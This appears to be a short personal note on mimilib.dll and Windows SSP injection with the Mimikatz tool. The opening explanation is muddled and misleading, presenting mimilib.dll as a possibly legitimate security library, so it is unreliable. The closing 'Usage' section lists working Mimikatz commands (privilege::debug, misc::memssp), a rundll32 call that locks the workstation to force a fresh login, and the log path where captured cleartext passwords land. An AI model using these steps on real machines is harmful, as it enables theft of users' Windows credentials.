The `SSP mimilib.dll` is a dynamic link library (DLL) file that is associated with certain software systems or security products, specifically related to the **SSP (Security Support Provider)** architecture in Microsoft Windows. The DLL is typically used by applications to implement security-related functions, such as authentication or secure communication protocols.

### Key Points:

1. **SSP (Security Support Provider)**: The SSP is a framework in Windows that allows security providers to implement and extend authentication methods. These providers work with authentication protocols, like Kerberos or NTLM (NT LAN Manager), and help secure communication and login processes in Windows-based systems.
   SSP : security support Provider
   ![[MIMIKATZ.png]]
1. **Mimilib**: This could be a specialized library linked to a particular version of the SSP, possibly tailored for specific use cases like handling certain cryptographic functions or handling specific authentication schemes.
    
3. **Mimilib.dll's Role**: This DLL file is part of the set of libraries that might be loaded to provide services like user authentication, secure communications, and other security-related operations.
    
4. **Security & Malware Concerns**: In some cases, `mimilib.dll` has been identified in association with **malicious software** (malware). Particularly, it may appear as part of certain exploits or software used by attackers to evade detection and gain unauthorized access. If the file is found in suspicious locations (like outside system directories), it could be an indication of malware or a trojan.

### Usage 	 

Inject SSP
	if user lockout and login try again , he's password saved clear text in 
	load on registry mimilib.dll
	this technique need administrator privileges 
	`mimikatz # privilege::debug
	`mimikatz # misc::memssp // load mimilib.dll in registry with kiwi name
	`CMD > rundll32 user32.dll,LockWorkstation // lock system
	*path the password saved :*`C:\Windows\System32\mimilsa.log`